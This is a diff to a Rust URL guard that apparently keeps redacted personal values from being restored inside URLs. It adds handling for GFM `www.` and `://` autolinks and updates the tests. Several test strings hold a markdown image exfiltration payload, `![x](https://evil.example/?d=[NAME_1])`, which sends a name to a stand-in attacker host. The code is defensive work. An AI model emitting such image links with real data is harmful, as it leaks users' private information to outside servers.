@@ -12,7 +12,10 @@
 //!   unescaped `>` or a line ending; a bare destination runs to ASCII space
 //!   or control, or an unbalanced `)`; backslash escapes are honoured; Unicode
 //!   whitespace never ends a URL.
-//! - Autolinks `<scheme:…>`.
+//! - Autolinks `<scheme:…>`, and GFM extended autolinks: after `www.` or
+//!   `://`, to ASCII whitespace. (The scheme, `www.` and email
+//!   addresses come before anything that marks them as a URL, and cannot
+//!   hold a `[KIND_n]` tag.)
 //! - Inside an HTML tag (`<` + letter … `>`), every attribute value; only
 //!   TAB, LF, FF, CR and SPACE end an unquoted one, as for browsers. A tag
 //!   is read from every `<` + letter, even inside what another reading
@@ -21,9 +24,10 @@
 //!   and what follows `@import` (to an unquoted `;`, across line breaks);
 //!   escapes are honoured, in names (`u\72l(`) and in strings.
 //!
-//! URLs written as plain text (`https://…`, `www.…`, `key=value`) are left
-//! to the engine's url-safe restore, which never restores a value after a
-//! URL-like run of text; [`Guarded`] tells it about the parts it skips.
+//! Other URL-like plain text (`key=value`, a value right after a URL) is
+//! left to the engine's url-safe restore, which never restores a value
+//! after a URL-like run of text; [`Guarded`] tells it about the parts it
+//! skips.
 //!
 //! Text arrives in pieces: every decision is made from characters already
 //! seen, and a trigger always ends before the text it guards, so nothing
@@ -66,6 +70,10 @@ enum Md {
     Scheme { len: u8 },
     /// `<scheme:…>`.
     Autolink,
+    /// A URL in plain text, after `://` or `www.`: to SPACE, TAB, LF, FF or
+    /// CR (cmark-gfm ends it there or earlier; other control characters
+    /// stay inside).
+    Literal,
 }
 
 /// One HTML tag reading (a start tag that may have begun at a `<` +
@@ -331,6 +339,10 @@ impl UrlGuard {
             Some(Md::DestBefore { new_line: false })
         } else if c.is_ascii_alphabetic() && prev == Some('<') {
             Some(Md::Scheme { len: 1 })
+        } else if self.recent.ends_with("://") || self.recent.ends_with("www.") {
+            // GFM extended autolinks (`http://`, `https://`, `www.`), and
+            // any other `scheme://`.
+            Some(Md::Literal)
         } else {
             None
         }
@@ -429,6 +441,8 @@ fn md_step(state: Md, c: char) -> (bool, Md) {
                 (true, Md::Autolink)
             }
         }
+        Md::Literal if html_space(c) => (false, Md::Free),
+        Md::Literal => (true, Md::Literal),
     }
 }
 
@@ -876,6 +890,11 @@ mod tests {
         "*‹www.›⟨e.example/a?b=[NAME_1]&c=d⟩*",
         // cmark-gfm ends the path only at ASCII whitespace or `<`.
         "‹www.›⟨e.example/?d=\u{a0}[NAME_1]⟩",
+        // Not at other control characters (cmark_isspace is SP, TAB, LF,
+        // VT, FF, CR).
+        "‹www.›⟨e.example/?d=\u{0}[NAME_1]⟩",
+        "‹http://›⟨e.example/?d=\u{1}[NAME_1]⟩",
+        "‹www.›⟨e.example/?d=\u{b}[NAME_1]\u{7f}[EMAIL_1]⟩",
         // `http://` and `https://`.
         "‹http://›⟨e.example/?d=[NAME_1]⟩ «[NAME_1]»",
         "go to ‹HTTPS://›⟨e.example/[NAME_1]⟩.",
@@ -1107,7 +1126,7 @@ mod tests {
     const MD_EXACT: &[(&str, &str)] = &[
         (
             "see ![x](https://evil.example/?d=[NAME_1]) and [NAME_1]",
-            "see ![x](⟨https://evil.example/?d=[NAME_1]⟩) and [NAME_1]",
+            "see ![x](⟨https://evil.example/?d=[NAME_1])⟩ and [NAME_1]",
         ),
         // An escaped `>` does not close a pointy destination.
         (
@@ -1122,11 +1141,11 @@ mod tests {
         // Unicode whitespace never ends a bare destination.
         (
             "![x](https://e/?d=\u{a0}[NAME_1]) [NAME_1]",
-            "![x](⟨https://e/?d=\u{a0}[NAME_1]⟩) [NAME_1]",
+            "![x](⟨https://e/?d=\u{a0}[NAME_1])⟩ [NAME_1]",
         ),
         (
             "![x](https://e/?d=\u{3000}[NAME_1]) [NAME_1]",
-            "![x](⟨https://e/?d=\u{3000}[NAME_1]⟩) [NAME_1]",
+            "![x](⟨https://e/?d=\u{3000}[NAME_1])⟩ [NAME_1]",
         ),
         // Balanced and escaped parentheses stay inside.
         ("[x](a(b)c[NAME_1]) z", "[x](⟨a(b)c[NAME_1]⟩) z"),
@@ -1712,6 +1731,7 @@ mod tests {
         }
         out.push_str(&g.finish());
         assert_eq!(out, "Hi Ravi, see ![x](https://e/?d=[NAME_1]) and Ravi");
-        assert_eq!(g.inner.1, "https://e/?d=[NAME_1]");
+        // The `)` too: after `://` the guard reads a GFM literal URL.
+        assert_eq!(g.inner.1, "https://e/?d=[NAME_1])");
     }
 }
